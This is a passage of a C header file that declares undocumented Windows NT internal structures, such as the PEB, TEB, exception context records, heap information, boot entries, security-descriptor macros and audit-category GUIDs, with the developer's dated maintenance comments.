    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    ULARGE_INTEGER AppCompatFlags;
    ULARGE_INTEGER AppCompatFlagsUser;
    PVOID pShimData;
    PVOID AppCompatInfo;

    UNICODE_STRING CSDVersion;

    PVOID ActivationContextData;
    PVOID ProcessAssemblyStorageMap;
    PVOID SystemDefaultActivationContextData;
    PVOID SystemAssemblyStorageMap;

    SIZE_T MinimumStackCommit;

    PPVOID FlsCallback;
    LIST_ENTRY FlsListHead;
    PVOID FlsBitmap;
    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
    ULONG FlsHighIndex;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;
    PVOID pContextData;
    PVOID pImageHeaderHash;
    union
    {
        ULONG TracingFlags;
        struct
        {
            ULONG HeapTracingEnabled : 1;
            ULONG CritSecTracingEnabled : 1;
            ULONG SpareTracingBits : 30;
        };
    };
} PEB, *PPEB;

//
//  Fusion/sxs thread state information (aka, stuff noone cares about!)
//

#define ACTIVATION_CONTEXT_STACK_FLAG_QUERIES_DISABLED (0x00000001)

typedef struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME
{
	struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME* Previous;
	struct _ACTIVATION_CONTEXT* ActivationContext;
	ULONG Flags;
} RTL_ACTIVATION_CONTEXT_STACK_FRAME, *PRTL_ACTIVATION_CONTEXT_STACK_FRAME;


typedef struct _ACTIVATION_CONTEXT_STACK
{
	struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME * ActiveFrame;
	struct _LIST_ENTRY FrameListCache;
	ULONG Flags;
	ULONG NextCookieSequenceNumber;
	ULONG StackId;
} ACTIVATION_CONTEXT_STACK, * PACTIVATION_CONTEXT_STACK;

typedef const ACTIVATION_CONTEXT_STACK * PCACTIVATION_CONTEXT_STACK;

#define TEB_ACTIVE_FRAME_CONTEXT_FLAG_EXTENDED (0x00000001)

typedef struct _TEB_ACTIVE_FRAME_CONTEXT
{
	ULONG Flags;
	PSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;

typedef const TEB_ACTIVE_FRAME_CONTEXT *PCTEB_ACTIVE_FRAME_CONTEXT;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT_EX
{
	TEB_ACTIVE_FRAME_CONTEXT BasicContext;
	PCSTR SourceLocation; // e.g. "c:\windows\system32\ntdll.dll"
} TEB_ACTIVE_FRAME_CONTEXT_EX, *PTEB_ACTIVE_FRAME_CONTEXT_EX;

typedef const TEB_ACTIVE_FRAME_CONTEXT_EX *PCTEB_ACTIVE_FRAME_CONTEXT_EX;

#define TEB_ACTIVE_FRAME_FLAG_EXTENDED (0x00000001)

// 17/3/2011 updated
typedef struct _TEB_ACTIVE_FRAME
{
	ULONG Flags;
	struct _TEB_ACTIVE_FRAME *Previous;
	PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;

typedef const TEB_ACTIVE_FRAME *PCTEB_ACTIVE_FRAME;

typedef struct _TEB_ACTIVE_FRAME_EX
{
	TEB_ACTIVE_FRAME BasicFrame;
	PVOID ExtensionIdentifier; // use address of your DLL Main or something mapping in the address space
} TEB_ACTIVE_FRAME_EX, *PTEB_ACTIVE_FRAME_EX;

typedef const TEB_ACTIVE_FRAME_EX *PCTEB_ACTIVE_FRAME_EX;

// 18/04/2011
typedef struct _TEB
{
    NT_TIB NtTib;

    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    PVOID WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    PVOID SystemReserved1[54];
    NTSTATUS ExceptionCode;
    PVOID ActivationContextStackPointer;
#if defined(_M_X64)
    UCHAR SpareBytes[24];
#else
    UCHAR SpareBytes[36];
#endif
    ULONG TxFsContext;

    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    ULONG_PTR Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    ULONG_PTR glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    LIST_ENTRY TlsLinks;

    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgSsReserved[2];

    ULONG HardErrorMode;
#if defined(_M_X64)
    PVOID Instrumentation[11];
#else
    PVOID Instrumentation[9];
#endif
    GUID ActivityId;

    PVOID SubProcessTag;
    PVOID EtwLocalData;
    PVOID EtwTraceData;
    PVOID WinSockData;
    ULONG GdiBatchCount;

    union
    {
        PROCESSOR_NUMBER CurrentIdealProcessor;
        ULONG IdealProcessorValue;
        struct
        {
            UCHAR ReservedPad0;
            UCHAR ReservedPad1;
            UCHAR ReservedPad2;
            UCHAR IdealProcessor;
        };
    };

    ULONG GuaranteedStackBytes;
    PVOID ReservedForPerf;
    PVOID ReservedForOle;
    ULONG WaitingOnLoaderLock;
    PVOID SavedPriorityState;
    ULONG_PTR SoftPatchPtr1;
    PVOID ThreadPoolData;
    PPVOID TlsExpansionSlots;
#if defined(_M_X64)
    PVOID DeallocationBStore;
    PVOID BStoreLimit;
#endif
    ULONG MuiGeneration;
    ULONG IsImpersonating;
    PVOID NlsCache;
    PVOID pShimData;
    ULONG HeapVirtualAffinity;
    HANDLE CurrentTransactionHandle;
    PTEB_ACTIVE_FRAME ActiveFrame;
    PVOID FlsData;

    PVOID PreferredLanguages;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;

    union
    {
        USHORT CrossTebFlags;
        USHORT SpareCrossTebBits : 16;
    };
    union
    {
        USHORT SameTebFlags;
        struct
        {
            USHORT SafeThunkCall : 1;
            USHORT InDebugPrint : 1;
            USHORT HasFiberData : 1;
            USHORT SkipThreadAttach : 1;
            USHORT WerInShipAssertCode : 1;
            USHORT RanProcessInit : 1;
            USHORT ClonedThread : 1;
            USHORT SuppressDebugMsg : 1;
            USHORT DisableUserStackWalk : 1;
            USHORT RtlExceptionAttached : 1;
            USHORT InitialThread : 1;
            USHORT SpareSameTebBits : 1;
        };
    };

    PVOID TxnScopeEnterCallback;
    PVOID TxnScopeExitCallback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    ULONG SpareUlong0;
    PVOID ResourceRetValue;
} TEB, *PTEB;

#define PcTeb 0x18

#define RtlGetCurrentProcessId() (HandleToUlong(NtCurrentTeb()->ClientId.UniqueProcess))
#define RtlGetCurrentThreadId()  (HandleToUlong(NtCurrentTeb()->ClientId.UniqueThread))

#define ZwCurrentProcess() NtCurrentProcess()

// 17/3/2011 added
__inline struct _PEB * NtCurrentPeb() { return NtCurrentTeb()->ProcessEnvironmentBlock; }
#define WOWAddress() ( NtCurrentTeb()->WOW32Reserved )
#define RtlProcessHeap() ( NtCurrentPeb()->ProcessHeap )

// 28/3/2011 added
#define RtlAcquireLockRoutine(L) RtlEnterCriticalSection((PRTL_CRITICAL_SECTION)(L))

// added 18.04.2011
typedef struct _THREAD_BASIC_INFORMATION
{
	NTSTATUS ExitStatus;
	PTEB TebBaseAddress;
	CLIENT_ID ClientId;
	KAFFINITY AffinityMask;
	KPRIORITY Priority;
	KPRIORITY BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

// added 20.12.11
// Process Device Map information
//  NtQueryInformationProcess using ProcessDeviceMap
//  NtSetInformationProcess using ProcessDeviceMap
//
//#pragma pack (push, 1)
typedef struct _PROCESS_DEVICEMAP_INFORMATION {
    union {
        struct {
            HANDLE DirectoryHandle;
        } Set;
        struct {
            ULONG DriveMap;
            UCHAR DriveType[ 32 ];
        } Query;
    };
} PROCESS_DEVICEMAP_INFORMATION, *PPROCESS_DEVICEMAP_INFORMATION;

typedef struct _PROCESS_DEVICEMAP_INFORMATION_EX {
    union {
        struct {
            HANDLE DirectoryHandle;
        } Set;
        struct {
            ULONG DriveMap;
            UCHAR DriveType[ 32 ];
        } Query;
    };
    ULONG Flags;    // specifies that the query type
} PROCESS_DEVICEMAP_INFORMATION_EX, *PPROCESS_DEVICEMAP_INFORMATION_EX;
//#pragma pack(pop)

typedef struct _PROCESS_BASIC_INFORMATION
{
	NTSTATUS ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	KPRIORITY BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
typedef PROCESS_BASIC_INFORMATION *PPROCESS_BASIC_INFORMATION;

typedef struct _PROCESS_EXTENDED_BASIC_INFORMATION
{
	SIZE_T Size;    // Must be set to structure size on input
	PROCESS_BASIC_INFORMATION BasicInfo;
	union
	{
		ULONG Flags;
		struct
		{
			ULONG IsProtectedProcess : 1;
			ULONG IsWow64Process : 1;
			ULONG IsProcessDeleting : 1;
			ULONG IsCrossSessionCreate : 1;
			ULONG SpareBits : 28;
		} DUMMYSTRUCTNAME;
	} DUMMYUNIONNAME;
} PROCESS_EXTENDED_BASIC_INFORMATION, *PPROCESS_EXTENDED_BASIC_INFORMATION;

typedef struct _RTL_HEAP_ENTRY
{
	SIZE_T Size;
	USHORT Flags;
	USHORT AllocatorBackTraceIndex;
	union
	{
		struct
		{
			SIZE_T Settable;
			ULONG Tag;
		} s1;   // All other heap entries
		struct
		{
			SIZE_T CommittedSize;
			PVOID FirstBlock;
		} s2;   // RTL_SEGMENT
	} u;
} RTL_HEAP_ENTRY, *PRTL_HEAP_ENTRY;

#define RTL_HEAP_BUSY               (USHORT)0x0001
#define RTL_HEAP_SEGMENT            (USHORT)0x0002
#define RTL_HEAP_SETTABLE_VALUE     (USHORT)0x0010
#define RTL_HEAP_SETTABLE_FLAG1     (USHORT)0x0020
#define RTL_HEAP_SETTABLE_FLAG2     (USHORT)0x0040
#define RTL_HEAP_SETTABLE_FLAG3     (USHORT)0x0080
#define RTL_HEAP_SETTABLE_FLAGS     (USHORT)0x00E0
#define RTL_HEAP_UNCOMMITTED_RANGE  (USHORT)0x0100
#define RTL_HEAP_PROTECTED_ENTRY    (USHORT)0x0200

typedef struct _RTL_HEAP_TAG
{
	ULONG NumberOfAllocations;
	ULONG NumberOfFrees;
	SIZE_T BytesAllocated;
	USHORT TagIndex;
	USHORT CreatorBackTraceIndex;
	WCHAR TagName[ 24 ];
} RTL_HEAP_TAG, *PRTL_HEAP_TAG;

typedef struct _RTL_HEAP_INFORMATION
{
	PVOID BaseAddress;
	ULONG Flags;
	USHORT EntryOverhead;
	USHORT CreatorBackTraceIndex;
	SIZE_T BytesAllocated;
	SIZE_T BytesCommitted;
	ULONG NumberOfTags;
	ULONG NumberOfEntries;
	ULONG NumberOfPseudoTags;
	ULONG PseudoTagGranularity;
	ULONG Reserved[ 5 ];
	PRTL_HEAP_TAG Tags;
	PRTL_HEAP_ENTRY Entries;
} RTL_HEAP_INFORMATION, *PRTL_HEAP_INFORMATION;

typedef struct _RTL_PROCESS_HEAPS
{
	ULONG NumberOfHeaps;
	RTL_HEAP_INFORMATION Heaps[ 1 ];
} RTL_PROCESS_HEAPS, *PRTL_PROCESS_HEAPS;

typedef struct _RTL_PROCESS_LOCK_INFORMATION
{
	PVOID Address;
	USHORT Type;
	USHORT CreatorBackTraceIndex;

	HANDLE OwningThread;        // from the thread's ClientId->UniqueThread
	LONG LockCount;
	ULONG ContentionCount;
	ULONG EntryCount;

	//
	// The following fields are only valid for Type == RTL_CRITSECT_TYPE
	//

	LONG RecursionCount;

	//
	// The following fields are only valid for Type == RTL_RESOURCE_TYPE
	//

	ULONG NumberOfWaitingShared;
	ULONG NumberOfWaitingExclusive;
} RTL_PROCESS_LOCK_INFORMATION, *PRTL_PROCESS_LOCK_INFORMATION;

// do not name SHA_CTX, if using OpenSSL or such... produces errors.
typedef struct {
	ULONG Unknown[6];
	ULONG State[5];
	ULONG Count[2];
	UCHAR Buffer[64];
} ASHA_CTX, *PSHA_CTX;

struct _CONTEXT;
struct _EXCEPTION_RECORD;

// note, winnt.h ... such the pain-in-ass with this structure.
#if !defined(_WINNT_)
typedef
EXCEPTION_DISPOSITION
(*PEXCEPTION_ROUTINE) (
    IN struct _EXCEPTION_RECORD *ExceptionRecord,
    IN PVOID EstablisherFrame,
    IN OUT struct _CONTEXT *ContextRecord,
    IN OUT PVOID DispatcherContext
    );

typedef struct _EXCEPTION_REGISTRATION_RECORD {
    struct _EXCEPTION_REGISTRATION_RECORD *Next;
    PEXCEPTION_ROUTINE Handler;
} EXCEPTION_REGISTRATION_RECORD;

typedef EXCEPTION_REGISTRATION_RECORD *PEXCEPTION_REGISTRATION_RECORD;
#endif

#if !defined(POINTER_64)
#define POINTER_64 __ptr64
typedef unsigned __int64 POINTER_64_INT;
#if defined(_M_X64)
#define POINTER_32 __ptr32
#else
#define POINTER_32
#endif
#endif

typedef enum _NT_PRODUCT_TYPE
{
	NtProductWinNt = 1,
	NtProductLanManNt,
	NtProductServer
} NT_PRODUCT_TYPE, *PNT_PRODUCT_TYPE;


typedef enum _SUITE_TYPE
{
	SmallBusiness,
	Enterprise,
	BackOffice,
	CommunicationServer,
	TerminalServer,
	SmallBusinessRestricted,
	EmbeddedNT,
	DataCenter,
	SingleUserTS,
	Personal,
	Blade,
	EmbeddedRestricted,
	SecurityAppliance,
	StorageServer,
	ComputeServer,
	MaxSuiteType
} SUITE_TYPE;

#define VER_SERVER_NT                       0x80000000
#define VER_WORKSTATION_NT                  0x40000000
#define VER_SUITE_SMALLBUSINESS             0x00000001
#define VER_SUITE_ENTERPRISE                0x00000002
#define VER_SUITE_BACKOFFICE                0x00000004
#define VER_SUITE_COMMUNICATIONS            0x00000008
#define VER_SUITE_TERMINAL                  0x00000010
#define VER_SUITE_SMALLBUSINESS_RESTRICTED  0x00000020
#define VER_SUITE_EMBEDDEDNT                0x00000040
#define VER_SUITE_DATACENTER                0x00000080
#define VER_SUITE_SINGLEUSERTS              0x00000100
#define VER_SUITE_PERSONAL                  0x00000200
#define VER_SUITE_BLADE                     0x00000400
#define VER_SUITE_EMBEDDED_RESTRICTED       0x00000800
#define VER_SUITE_SECURITY_APPLIANCE        0x00001000
#define VER_SUITE_STORAGE_SERVER            0x00002000
#define VER_SUITE_COMPUTE_SERVER            0x00004000

//
// exception structures
//

#ifndef _WINNT_		// take presidence over winnt.h

typedef struct _CONTEXT
{

	//
	// The flags values within this flag control the contents of
	// a CONTEXT record.
	//
	// If the context record is used as an input parameter, then
	// for each portion of the context record controlled by a flag
	// whose value is set, it is assumed that that portion of the
	// context record contains valid context. If the context record
	// is being used to modify a threads context, then only that
	// portion of the threads context will be modified.
	//
	// If the context record is used as an IN OUT parameter to capture
	// the context of a thread, then only those portions of the thread's
	// context corresponding to set flags will be returned.
	//
	// The context record is never used as an OUT only parameter.
	//

	DWORD ContextFlags;

	//
	// This section is specified/returned if CONTEXT_DEBUG_REGISTERS is
	// set in ContextFlags.  Note that CONTEXT_DEBUG_REGISTERS is NOT
	// included in CONTEXT_FULL.
	//

	DWORD   Dr0;
	DWORD   Dr1;
	DWORD   Dr2;
	DWORD   Dr3;
	DWORD   Dr6;
	DWORD   Dr7;

	//
	// This section is specified/returned if the
	// ContextFlags word contians the flag CONTEXT_FLOATING_POINT.
	//

	FLOATING_SAVE_AREA FloatSave;

	//
	// This section is specified/returned if the
	// ContextFlags word contians the flag CONTEXT_SEGMENTS.
	//

	DWORD   SegGs;
	DWORD   SegFs;
	DWORD   SegEs;
	DWORD   SegDs;

	//
	// This section is specified/returned if the
	// ContextFlags word contians the flag CONTEXT_INTEGER.
	//

	DWORD   Edi;
	DWORD   Esi;
	DWORD   Ebx;
	DWORD   Edx;
	DWORD   Ecx;
	DWORD   Eax;

	//
	// This section is specified/returned if the
	// ContextFlags word contians the flag CONTEXT_CONTROL.
	//

	DWORD   Ebp;
	DWORD   Eip;
	DWORD   SegCs;              // MUST BE SANITIZED
	DWORD   EFlags;             // MUST BE SANITIZED
	DWORD   Esp;
	DWORD   SegSs;

	//
	// This section is specified/returned if the ContextFlags word
	// contains the flag CONTEXT_EXTENDED_REGISTERS.
	// The format and contexts are processor specific
	//

	BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];

} CONTEXT, *PCONTEXT;

typedef struct _EXCEPTION_RECORD
{
	DWORD  ExceptionCode;																						// NTSTATUS code of the exception.
	DWORD ExceptionFlags;																						// need more information
	struct _EXCEPTION_RECORD *ExceptionRecord;											// pointer to an extra record
	PVOID ExceptionAddress;																					// address of the exception happen
	DWORD NumberParameters;																					// more information needed ...
	ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];
} EXCEPTION_RECORD, *PEXCEPTION_RECORD;

//
//  Values put in ExceptionRecord.ExceptionInformation[0]
//  First parameter is always in ExceptionInformation[1],
//  Second parameter is always in ExceptionInformation[2]
//

typedef struct _EXCEPTION_RECORD32 {
	DWORD ExceptionCode;
	DWORD ExceptionFlags;
	DWORD ExceptionRecord;
	DWORD ExceptionAddress;
	DWORD NumberParameters;
	DWORD ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];
} EXCEPTION_RECORD32, *PEXCEPTION_RECORD32;

typedef struct _EXCEPTION_RECORD64 {
	DWORD    ExceptionCode;
	DWORD ExceptionFlags;
	DWORD64 ExceptionRecord;
	DWORD64 ExceptionAddress;
	DWORD NumberParameters;
	DWORD __unusedAlignment;
	DWORD64 ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];
} EXCEPTION_RECORD64, *PEXCEPTION_RECORD64;

//
// Typedef for pointer returned by exception_info()
//

typedef struct _EXCEPTION_POINTERS
{
	PEXCEPTION_RECORD ExceptionRecord;
	PCONTEXT ContextRecord;
} EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;

#endif

typedef NTSTATUS (NTAPI * PRTL_QUERY_REGISTRY_ROUTINE)(
	IN PWSTR ValueName,
	IN ULONG ValueType,
	IN PVOID ValueData,
	IN ULONG ValueLength,
	IN PVOID Context,
	IN PVOID EntryContext
	);

typedef struct _RTL_QUERY_REGISTRY_TABLE {
	PRTL_QUERY_REGISTRY_ROUTINE QueryRoutine;
	ULONG Flags;
	PWSTR Name;
	PVOID EntryContext;
	ULONG DefaultType;
	PVOID DefaultData;
	ULONG DefaultLength;

} RTL_QUERY_REGISTRY_TABLE, *PRTL_QUERY_REGISTRY_TABLE;

#define EXCEPTION_CHAIN_END ((struct _EXCEPTION_REGISTRATION_RECORD * POINTER_32)-1)

#define MAJOR_VERSION 30
#define MINOR_VERSION 00
#define OS2_VERSION (MAJOR_VERSION << 8 | MINOR_VERSION )

#ifdef DBG
#define DBG_TEB_THREADNAME 16
#define DBG_TEB_RESERVED_1 15
#define DBG_TEB_RESERVED_2 14
#define DBG_TEB_RESERVED_3 13
#define DBG_TEB_RESERVED_4 12
#define DBG_TEB_RESERVED_5 11
#define DBG_TEB_RESERVED_6 10
#define DBG_TEB_RESERVED_7  9
#define DBG_TEB_RESERVED_8  8
#endif // DBG

#define PROCESS_PRIORITY_CLASS_UNKNOWN      0
#define PROCESS_PRIORITY_CLASS_IDLE         1
#define PROCESS_PRIORITY_CLASS_NORMAL       2
#define PROCESS_PRIORITY_CLASS_HIGH         3
#define PROCESS_PRIORITY_CLASS_REALTIME     4
#define PROCESS_PRIORITY_CLASS_BELOW_NORMAL 5
#define PROCESS_PRIORITY_CLASS_ABOVE_NORMAL 6

typedef struct _PROCESS_PRIORITY_CLASS {
	BOOLEAN Foreground;
	UCHAR PriorityClass;
} PROCESS_PRIORITY_CLASS, *PPROCESS_PRIORITY_CLASS;

typedef struct _PROCESS_FOREGROUND_BACKGROUND {
	BOOLEAN Foreground;
} PROCESS_FOREGROUND_BACKGROUND, *PPROCESS_FOREGROUND_BACKGROUND;

typedef struct _FILE_PATH {
	ULONG Version;
	ULONG Length;
	ULONG Type;
	UCHAR FilePath[ANYSIZE_ARRAY];
} FILE_PATH, *PFILE_PATH;

#define FILE_PATH_VERSION 1

#define FILE_PATH_TYPE_ARC           1
#define FILE_PATH_TYPE_ARC_SIGNATURE 2
#define FILE_PATH_TYPE_NT            3
#define FILE_PATH_TYPE_EFI           4

#define FILE_PATH_TYPE_MIN FILE_PATH_TYPE_ARC
#define FILE_PATH_TYPE_MAX FILE_PATH_TYPE_EFI

typedef struct _WINDOWS_OS_OPTIONS {
	UCHAR Signature[8];
	ULONG Version;
	ULONG Length;
	ULONG OsLoadPathOffset;
	WCHAR OsLoadOptions[ANYSIZE_ARRAY];
	//FILE_PATH OsLoadPath;
} WINDOWS_OS_OPTIONS, *PWINDOWS_OS_OPTIONS;

#define WINDOWS_OS_OPTIONS_SIGNATURE "WINDOWS"

#define WINDOWS_OS_OPTIONS_VERSION 1

typedef struct _BOOT_ENTRY {
	ULONG Version;
	ULONG Length;
	ULONG Id;
	ULONG Attributes;
	ULONG FriendlyNameOffset;
	ULONG BootFilePathOffset;
	ULONG OsOptionsLength;
	UCHAR OsOptions[ANYSIZE_ARRAY];
	//WCHAR FriendlyName[ANYSIZE_ARRAY];
	//FILE_PATH BootFilePath;
} BOOT_ENTRY, *PBOOT_ENTRY;

typedef struct _BOOT_OPTIONS {
	ULONG Version;
	ULONG Length;
	ULONG Timeout;
	ULONG CurrentBootEntryId;
	ULONG NextBootEntryId;
	WCHAR HeadlessRedirection[ANYSIZE_ARRAY];
} BOOT_OPTIONS, *PBOOT_OPTIONS;


//
// Security APIs.
//

typedef struct _USER_SID
{
	SID_IDENTIFIER_AUTHORITY sidAuthority;
	ULONG UserGroupId;
	ULONG UserId;
} USER_SID, *PUSER_SID;


typedef struct _USER_PERMISSION
{
	USER_SID UserSid;						// identifies the user for whom you want to grant permissions to
	ULONG dwAccessType;         // currently, this is either ACCESS_ALLOWED_ACE_TYPE or  ACCESS_DENIED_ACE_TYPE
	BOOL bInherit;              // the permissions inheritable? (eg a directory or reg key and you want new children to inherit this permission)
	ULONG dwAccessMask;         // access granted (eg FILE_LIST_CONTENTS or KEY_ALL_ACCESS, etc...)
	ULONG dwInheritMask;        // mask used for inheritance, usually (OBJECT_INHERIT_ACE | CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE)
	ULONG dwInheritAccessMask;  // the inheritable access granted (eg GENERIC_ALL)
} USER_PERMISSION, *PUSER_PERMISSION;

#define LongAlignPtr(Ptr) ((PVOID)(((ULONG_PTR)(Ptr) + 3) & -4))
#define LongAlignSize(Size) (((ULONG)(Size) + 3) & -4)

//
// Macros for calculating the address of the components of a security
// descriptor.  This will calculate the address of the field regardless
// of whether the security descriptor is absolute or self-relative form.
// A null value indicates the specified field is not present in the
// security descriptor.
//

#define RtlpOwnerAddrSecurityDescriptor( SD )                                  \
           (  ((SD)->Control & SE_SELF_RELATIVE) ?                             \
               (   (((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Owner == 0) ? ((PSID) NULL) :               \
                       (PSID)RtlOffsetToPointer((SD), ((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Owner)    \
               ) :                                                             \
               (PSID)((SD)->Owner)                                             \
           )

#define RtlpGroupAddrSecurityDescriptor( SD )                                  \
           (  ((SD)->Control & SE_SELF_RELATIVE) ?                             \
               (   (((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Group == 0) ? ((PSID) NULL) :               \
                       (PSID)RtlOffsetToPointer((SD), ((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Group)    \
               ) :                                                             \
               (PSID)((SD)->Group)                                             \
           )

#define RtlpSaclAddrSecurityDescriptor( SD )                                   \
           ( (!((SD)->Control & SE_SACL_PRESENT) ) ?                           \
             (PACL)NULL :                                                      \
               (  ((SD)->Control & SE_SELF_RELATIVE) ?                         \
                   (   (((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Sacl == 0) ? ((PACL) NULL) :            \
                           (PACL)RtlOffsetToPointer((SD), ((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Sacl) \
                   ) :                                                         \
                   (PACL)((SD)->Sacl)                                          \
               )                                                               \
           )

#define RtlpDaclAddrSecurityDescriptor( SD )                                   \
           ( (!((SD)->Control & SE_DACL_PRESENT) ) ?                           \
             (PACL)NULL :                                                      \
               (  ((SD)->Control & SE_SELF_RELATIVE) ?                         \
                   (   (((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Dacl == 0) ? ((PACL) NULL) :            \
                           (PACL)RtlOffsetToPointer((SD), ((SECURITY_DESCRIPTOR_RELATIVE *) (SD))->Dacl) \
                   ) :                                                         \
                   (PACL)((SD)->Dacl)                                          \
               )                                                               \
           )


//
//  Macro to determine if the given ID has the owner attribute set,
//  which means that it may be assignable as an owner
//  The GroupSid should not be marked for UseForDenyOnly.
//

#define RtlpIdAssignableAsOwner( G )                                               \
            ( (((G).Attributes & SE_GROUP_OWNER) != 0)  &&                         \
              (((G).Attributes & SE_GROUP_USE_FOR_DENY_ONLY) == 0) )

//
//  Macro to copy the state of the passed bits from the old security
//  descriptor (OldSD) into the Control field of the new one (NewSD)
//

#define RtlpPropagateControlBits( NewSD, OldSD, Bits )                             \
            ( NewSD )->Control |=                     \
            (                                                                  \
            ( OldSD )->Control & ( Bits )             \
            )


//
//  Macro to query whether or not the passed set of bits are ALL on
//  or not (ie, returns FALSE if some are on and not others)
//

#define RtlpAreControlBitsSet( SD, Bits )                                          \
            (BOOLEAN)                                                          \
            (                                                                  \
            (( SD )->Control & ( Bits )) == ( Bits )  \
            )

//
//  Macro to set the passed control bits in the given Security Descriptor
//

#define RtlpSetControlBits( SD, Bits )                                             \
            (                                                                  \
            ( SD )->Control |= ( Bits )                                        \
            )

//
//  Macro to clear the passed control bits in the given Security Descriptor
//

#define RtlpClearControlBits( SD, Bits )	\
            (															\
            ( SD )->Control &= ~( Bits )	\
            )


//
// Local Security Authority APIs.
//

#ifdef DEFINE_GUID

/* 0cce9210-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_System_SecurityStateChange_defined)
    DEFINE_GUID(
        Audit_System_SecurityStateChange,
        0x0cce9210,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_System_SecurityStateChange_defined
    #endif
#endif

/* 0cce9211-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_System_SecuritySubsystemExtension_defined)
    DEFINE_GUID(
        Audit_System_SecuritySubsystemExtension,
        0x0cce9211,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_System_SecuritySubsystemExtension_defined
    #endif
#endif

/* 0cce9212-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_System_Integrity_defined)
    DEFINE_GUID(
        Audit_System_Integrity,
        0x0cce9212,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_System_Integrity_defined
    #endif
#endif

/* 0cce9213-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_System_IPSecDriverEvents_defined)
    DEFINE_GUID(
        Audit_System_IPSecDriverEvents,
        0x0cce9213,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_System_IPSecDriverEvents_defined
    #endif
#endif

/* 0cce9214-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_System_Others_defined)
    DEFINE_GUID(
        Audit_System_Others,
        0x0cce9214,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_System_Others_defined
    #endif
#endif

/* 0cce9215-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_Logon_defined)
    DEFINE_GUID(
        Audit_Logon_Logon,
        0x0cce9215,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_Logon_defined
    #endif
#endif

/* 0cce9216-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_Logoff_defined)
    DEFINE_GUID(
        Audit_Logon_Logoff,
        0x0cce9216,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
    #define Audit_Logon_Logoff_defined
    #endif
#endif

/* 0cce9217-69ae-11d9-bed3-505054503030 */
#if !defined(INITGUID) || !defined(Audit_Logon_AccountLockout_defined)
    DEFINE_GUID(
        Audit_Logon_AccountLockout,
        0x0cce9217,
        0x69ae, 0x11d9, 0xbe, 0xd3, 0x50, 0x50, 0x54, 0x50, 0x30, 0x30
    	);
    #ifdef INITGUID
